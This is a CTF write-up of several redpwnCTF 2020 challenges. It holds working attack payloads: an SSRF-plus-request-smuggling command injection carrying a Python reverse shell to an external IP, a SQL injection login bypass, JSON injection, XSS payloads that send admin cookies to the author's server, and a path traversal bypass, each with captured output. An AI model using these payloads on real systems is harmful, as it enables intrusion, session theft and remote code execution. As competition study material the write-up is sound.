# Post-it-notes

It looks like we can do request smuggling/SSRF on the check-links route.  First lets find which port the api server is running on via SSRF

```python
import requests

for port in range(50000, 51001):
    r = requests.post("http://2020.redpwnc.tf:31957/check-links", data = {
        'links': 'http://localhost:' + str(port)
    },  proxies={'http':'http://127.0.0.1:8080'})
    if ("true" in r.text):
        print("Port is " + str(port))
        break
```

And when we run it

```shell-session
╭─zoey@nomadic ~/sec/redpwnctf/post-it-notes 
╰─$ python find-api-server.py                           
Port is 50528
```

Now lets try the request smuggling so we can send a GET request to `/api/v1/notes/`.  The following request will still pass the regular expressions, while
allowing us to perform request smuggling.  We can test on our local server.

```
http://127.0.0.1

GET /api/v1/notes/?title=test HTTP/1.1

:50528/
```

Now let's compose something for the command injection.  We already know we have python so lets setup a reverse shell with it.  Our request now becomes

```
http://127.0.0.1

GET /api/v1/notes/?title='||python%20%2Dc%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%22136%2E24%2E87%2E77%22%2C22473%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%29%3B%27||echo+' HTTP/1.1

:50528/
```

Lets setup a netcat listener, then URL encode the payload and send it along

```
curl -i -s -k -X $'POST' \
    -H $'Host: 2020.redpwnc.tf:31957' -H $'User-Agent: python-requests/2.23.0' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Connection: close' -H $'Content-Length: 653' -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'links=http%3A%2F%2F127%2E0%2E0%2E1%0A%0AGET%20%2Fapi%2Fv1%2Fnotes%2F%3Ftitle%3D%27%7C%7Cpython%2520%252Dc%2520%2527import%2520socket%252Csubprocess%252Cos%253Bs%253Dsocket%252Esocket%2528socket%252EAF%255FINET%252Csocket%252ESOCK%255FSTREAM%2529%253Bs%252Econnect%2528%2528%2522136%252E24%252E87%252E77%2522%252C22473%2529%2529%253Bos%252Edup2%2528s%252Efileno%2528%2529%252C0%2529%253B%2520os%252Edup2%2528s%252Efileno%2528%2529%252C1%2529%253B%2520os%252Edup2%2528s%252Efileno%2528%2529%252C2%2529%253Bp%253Dsubprocess%252Ecall%2528%255B%2522%252Fbin%252Fsh%2522%252C%2522%252Di%2522%255D%2529%253B%2527%7C%7Cecho%2B%27%20HTTP%2F1%2E1%0A%0A%3A50528%2F' \
    $'http://2020.redpwnc.tf:31957/check-links'
```

And on our listener:

```shell-session
╭─zoey@nomadic ~/sec/redpwnctf/panda-facts 
╰─$ nc -lvp 22473
listening on [any] 22473 ...
connect to [192.168.100.224] from 250.191.75.34.bc.googleusercontent.com [34.75.191.250] 593
66
/bin/sh: 0: can't access tty; job control turned off
$ ls
api
flag.txt
main.py
notes
notes.py
web
$ cat flag.txt
flag{y0u_b3tt3r_n0t_m@k3_m3_l0s3_my_pyth0n_d3v_j0b}
```

# Login

Looking at the source, we see that an sqlite database is being accessed with an SQL query that's not parameterized.  The following will log us in:

```
╭─zoey@nomadic ~/sec/redpwnctf/post-it-notes 
╰─$ curl 'https://login.2020.redpwnc.tf/api/flag' \
  -H 'authority: login.2020.redpwnc.tf' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36' \
  -H 'content-type: application/json' \
  -H 'accept: */*' \
  -H 'origin: https://login.2020.redpwnc.tf' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://login.2020.redpwnc.tf/' \
  -H 'accept-language: en-US,en;q=0.9,la;q=0.8' \
  --data-binary $'{"username":"","password":"\' OR 1;--"}' \
  --compressed
{"success":true,"flag":"flag{0bl1g4t0ry_5ql1}"}
```

# Panda Facts

We have control over the username, and if we modify it we can change the JSON string that's parsed, overwriting the earlier values.

```javascript
╭─zoey@nomadic ~/sec/redpwnctf/panda-facts 
╰─$ node
> let INTEGRITY='12370cc0f387730fb3f273e4d46a94e5';
undefined
> let username='", "member": 1, "username": "test';
undefined
> let parsedToken = JSON.parse(`{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`)
undefined
> JSON.stringify(parsedToken);
'{"integrity":"12370cc0f387730fb3f273e4d46a94e5","member":1,"username":"test"}'
```

Now we just have to throw our test value into the web requests

```shell-session
╭─zoey@nomadic ~/sec/redpwnctf/panda-facts 
╰─$ curl 'https://panda-facts.2020.redpwnc.tf/api/login' \
  -H 'content-type: application/json' \
  --data-binary '{"username":"\", \"member\": 1, \"username\": \"test"}' \
  
{"token":"UK4cRIQoC6CqgCXpQeQIyU6V0PL6UZ+P/XEROuEd2XqqG77e6Op7ittY2dy0oUppbiLf1hBSSiyq+aWAViCIodkoXy8C+kxL+sSrxZN1fioY3lL8qBvOr3A4u1U/weNoMlXv6k7Y3yJt9BbzMfdsrA=="}                     
╭─zoey@nomadic ~/sec/redpwnctf/panda-facts 
╰─$ curl 'https://panda-facts.2020.redpwnc.tf/api/flag' \
 -H 'cookie: token=UK4cRIQoC6CqgCXpQeQIyU6V0PL6UZ+P/XEROuEd2XqqG77e6Op7ittY2dy0oUppbiLf1hBSSiyq+aWAViCIodkoXy8C+kxL+sSrxZN1fioY3lL8qBvOr3A4u1U/weNoMlXv6k7Y3yJt9BbzMfdsrA=='  
{"success":true,"flag":"flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}"}
```

# static-pastebin

The `/paste` route takes a base64 hash value, runs it through a `clean` function and then uses `element.innerHTML=...` to set it.  It looks like we should be able to
get XSS if we can bypass the `clean` function.  Lets take a look at it

```javascript
function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```

So it looks like this is defeatable if we add in a `>` character prior to the opening of a tag, and then a second `<` after the close of the tag.  Only problem with
script tags, is I don't think there's a valid javascript command that starts with a `<` and I'm not sure we can comment it out.  So lets just keep the javascript
inside the single tag itself with

```
><img src=x onerror=alert(1)><
```

When we base64 encode this and navigate to `https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPXggb25lcnJvcj1hbGVydCgxKT48` we get the alert, success!  The
second part of the challenge is that we can report a URL to the admin.  Lets modify our payload and see if the admin has access to any interesting cookie values:

```
><img src=x onerror="fetch('https://www.zoeyinthe.cloud/'+btoa(document.cookie));"><
```

Then after base64 encoding the URL we end up with is `https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPXggb25lcnJvcj0iZmV0Y2goJ2h0dHBzOi8vd3d3LnpvZXlpbnRoZS5jbG91ZC8nK2J0b2EoZG9jdW1lbnQuY29va2llKSk7Ij48`.
Lets send this to the admin.  We'll need to do this manually in the browser given the recaptcha challenge.  We drop the URL into the form, and then go to check
the logs on our server:

```
107.178.229.236 - - [22/Jun/2020:02:59:57 +0000] "GET /ZmxhZz1mbGFnezU0bjF0MXo0dDEwbl9rMW5kNF9oNHJkfQ== HTTP/1.1" 404 199 "https://static-pastebin.2020.redpwnc.tf/paste/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.0 Safari/537.36"
```

We got a value!  When we decode it we get `flag=flag{54n1t1z4t10n_k1nd4_h4rd}`

# static-static-hosting

According to the clean/sanitize functions we're allowed tags with a src attribute, so we should be able to use a frame src.

```javascript
function clean(input) {
    const template = document.createElement('template');
    const html = document.createElement('html');
    template.content.appendChild(html);
    html.innerHTML = input;

    sanitize(html);

    const result = html.innerHTML;
    return result;
}

function sanitize(element) {
    const attributes = element.getAttributeNames();
    for (let i = 0; i < attributes.length; i++) {
        // Let people add images and styles
        if (!['src', 'width', 'height', 'alt', 'class'].includes(attributes[i])) {
            element.removeAttribute(attributes[i]);
        }
    }

    const children = element.children;
    for (let i = 0; i < children.length; i++) {
        if (children[i].nodeName === 'SCRIPT') {
            element.removeChild(children[i]);
            i --;
        } else {
            sanitize(children[i]);
        }
    }
}
```

Let's write a payload `frameset><frame src="javascript:fetch('https://zoeyinthe.cloud/'+btoa(document.cookie))"></frameset>` and then use the site to encode
it to the URL `https://static-static-hosting.2020.redpwnc.tf/site/#PGZyYW1lc2V0PjxmcmFtZSBzcmM9ImphdmFzY3JpcHQ6ZmV0Y2goJ2h0dHBzOi8vem9leWludGhlLmNsb3VkLycrYnRvYShkb2N1bWVudC5jb29raWUpKSI+PC9mcmFtZXNldD4=`

When we send that link to the admin we end up with an entry in the logs of our site:

```
107.178.229.239 - - [23/Jun/2020:02:15:14 +0000] "GET /ZmxhZz1mbGFne3doMF9uMzNkNV9kMG1wdXIxZnl9 HTTP/1.1" 404 199 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/83.0.4103.0 Safari/537.36"
```

Decoding the base64 yields `flag=flag{wh0_n33d5_d0mpur1fy}`

# tux-fanpage

Looking at the source, we can see that the usual, common path traversal options won't work.  However, express allows you to send arrays as query strings if you
include the value twice.  Looking at the sanitization functions, it looks like we might be able to bypass them.  Let's check

```javascript
//Strip leading characters
function strip(dir){
    const regex = /^[a-z0-9]$/im

    //Remove first character if not alphanumeric
    if(!regex.test(dir[0])){
        if(dir.length > 0){
            return strip(dir.slice(1))
        }
        return ''
    }

    return dir
}
```

So we need `dir[0]` to be alphanumeric, no problem.  Let's try `https://tux-fanpage.2020.redpwnc.tf/page?path=i&path=index.js`.  Next up is the `preventTraversal`
function

```javascript
//Prevent directory traversal attack
function preventTraversal(dir){
    if(dir.includes('../')){
        let res = dir.replace('../', '')
        return preventTraversal(res)
    }

    //In case people want to test locally on windows
    if(dir.includes('..\\')){
        let res = dir.replace('..\\', '')
        return preventTraversal(res)
    }
    return dir
}
```

Well, as long as won't have a value in our array that is exactly `../` we should be find getting past this.  Lastly there's a function to prepare the path.

```javascript
//Get absolute path from relative path
function prepare(dir){
    return path.resolve('./public/' + dir)
}
```

Javascript, through type coercion, will call `toString` on the array, and it will end up as `i,index.js`, not quite the filename we need.  However, we've bypassed
the check on the second item in the array and we can start throwing in `../` before the `index.js`, treating the value `i,` as a directory to be escaped.  After a few
attempts we succeed:

```shell-session
╭─zoey@nomadic ~/sec/redpwnctf/tux-fanpage 
╰─$ curl --silent 'https://tux-fanpage.2020.redpwnc.tf/page?path=i&path=../../../index.js' | grep flag
const flag = 'flag{tr4v3rsal_Tim3}'
```

# anti-textbook

Create the public key from the private in `data.txt`.

```
╭─zoey@nomadic ~/sec/redpwnctf/anti-textbook 
╰─$ RsaCtfTool/RsaCtfTool.py --createpub -n 23476345782117384360316464293694572348021858182972446102249052345232474617239084674995381439171455360619476964156250057548035539297034987528920054538760455425802275559282848838042795385223623239088627583122814519864252794995648742053597744613214146425693685364507684602090559028534555976544379804753832469034312177224373112610128420211922617372377101405991494199975508780694545263130816110474679504768973743009441005450839746644168233367636158687594826435608022717302508912914016439961300625816187681031915377565087756094989820015507950937541001438985964760705493680314579323085217869884649720526665543105616470022561 -e 65537 
private argument is not set, the private key will not be displayed, even if recovered.
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuffuWhYrpTW8cdcAWUwe
T8oZYCp/8pKPYj4eZ3pd7mhYoCkSSeqZ5e+L33O38SoMANogM1NBayYlumOcPxC/
C9PHMF6AlaLDH+yX/Fg+a055m0O7+5pJNUVuRn9z7aYhhubnRyjk2cVTHLmOHqK9
FPM1QBBdouddMgZYE6plaBdBIMwQ8txuZQs6t862zJfA0/cgT47TtiTNkouHkAuT
VXBPcbM5pXIu7MoflJrUjQ0ljuOIFgXQ7wCFusXrIpvuVpqLzRvTD69GA7Cj0Dt9
ij7KPrBFM2jFyR8vnm5w+T6sGafXgJEEj0sLmbIReWcNeyHC2Tl9OniyMEqPeLsZ
oQIDAQAB
-----END PUBLIC KEY-----
```

Turn it into a binary file

```
╭─zoey@nomadic ~/sec/redpwnctf/anti-textbook 
╰─$ echo "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuffuWhYrpTW8cdcAWUweT8oZYCp/8pKPYj4eZ3pd7mhYoCkSSeqZ5e+L33O38SoMANogM1NBayYlumOcPxC/C9PHMF6AlaLDH+yX/Fg+a055m0O7+5pJNUVuRn9z7aYhhubnRyjk2cVTHLmOHqK9FPM1QBBdouddMgZYE6plaBdBIMwQ8txuZQs6t862zJfA0/cgT47TtiTNkouHkAuTVXBPcbM5pXIu7MoflJrUjQ0ljuOIFgXQ7wCFusXrIpvuVpqLzRvTD69GA7Cj0Dt9ij7KPrBFM2jFyR8vnm5w+T6sGafXgJEEj0sLmbIReWcNeyHC2Tl9OniyMEqPeLsZoQIDAQAB" | base64 -d > pubkey
```

Get the sha256sum of the key.

```
╭─zoey@nomadic ~/sec/redpwnctf/anti-textbook 
╰─$ sha256sum pubkey                                      9db105389dd81cfb4b59ff1a4c0670c630b1800e542323111d5c5cb9af72031f  pubkey
```

Plug it into `crt.sh`'s advanced search

```
╭─zoey@nomadic ~/sec/redpwnctf/anti-textbook 
╰─$ curl --silent https://crt.sh/\?spkisha256\=9db105389dd81cfb4b59ff1a4c0670c630b1800e542323111d5c5cb9af72031f | grep '?id'
    <TD style="text-align:center"><A href="?id=2001057066">2001057066</A></TD>
    <TD style="text-align:center"><A href="?id=1998063179">1998063179</A></TD>
```

And we find two entries, let's checkout one to find the address

```
╭─zoey@nomadic ~/sec/redpwnctf/anti-textbook 
╰─$ curl https://crt.sh/\?id\=2001057066 | grep commonName
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 23424    0 23424    0     0  18088      0 --:--:--  0:00:01 --:--:-- 18088
...
commonName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;oa4gio7glypwggb9iu3rh8mrc87tnjbs.flag.ga
...
```

And now let's request something from the server.

```
╭─zoey@nomadic ~/sec/redpwnctf/anti-textbook 
╰─$ curl https://oa4gio7glypwggb9iu3rh8mrc87tnjbs.flag.ga
flag{c3rTific4t3_7r4n5pArAncY_fTw}
```

# panda-facts-v2

The code here is very similar to the first panda-facts, only instead of the string interpolation, the username is set as a string property on an object
literal before being stringified.  Because the encryption is utilizing CBC it's vulnerable to a bit flipping attack.  The integrity value hints at this too,
since if we tried to execute a bit-flipping attack on the original `"member": 0` value, we end up scrambling the integrity value.  However, we know from the
previous panda challenge, that if we can create a second entry for `member` we can overwrite the first.  Let's come up with a value for the username so that
we can align the value on the right boundaries and alter what we need to create the second entry.  Let's start with

```
"blockaftr---------------\",\"membe\":  "
```

This would setup the JSON to be

```js
'{"integrity":"d2068b64517a277e481166b9b488f593","member":0,"username":" blockend---------------\",\"membe\":  "}'
```

Now when we attempt our bit flipping we should be able to overwrite the `----------` with the trash/randomness that occurs, and overwrite the escape characters and the last quote so
that we end up with the valid JSON we need:

```js
'{"integrity":"d2068b64517a277e481166b9b488f593","member":0,"username":" blockend????????????????", "member":  1}'
// and when we parse it
 JSON.parse('{"integrity":"d2068b64517a277e481166b9b488f593","member":0,"username":" blockend????????????????", "member":  1}');
{ integrity: 'd2068b64517a277e481166b9b488f593',
  member: 1,
  username: ' blockend????????????????' }
```

Now we need to about writing the code to modify the cipher text.  

# cookie-recipes-v2

Use `infoResponse = await request('/api/userInfo', 'GET', {'id': 0});` in chrome console to get the password of the administrator: `n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn`

Use `infoResponse = await request('/api/getId', 'GET');` in chrome console to get the id of the current user, `8498535520629376472`.

https://www.zoeyinthe.cloud/cookie-csrf.html?userId=8498535520629376472

# flag-sharer

Hey there, not sure what all is kosher to ask, but I've been looking at the source for flag-sharer.  I'm assuming we need the admin to gift us the flag, we can do a 
CSRF POST via a form.submit(), but we'd need to grab the csrf token to match it to the cookie that's set.  So that leaves us with either css/style injection/
exfiltration(which seems like it might be likely given the {{{ error }}} in gifts.html), or XSS, but I don't see anyway to escape the `<style>` tag with the regex 
filter of `<>` on the error.  However, the `content-security-policy` header has me curious if it might be possible.  So now I'm wondering if there's some quirk of the 
CSS parser I'm not aware of that would allow me to sneak in additional import statement.  I've noticed adding in parentheses results in a request to 
`https://flag-sharer.ml/'/static/`, and adding a hash removes the latter part of the URL.  How am I doing?  Am I wasting my time trying to bypass the error regex in 
order to do something interesting?

Response

On the right track, don't worry too much about error regex.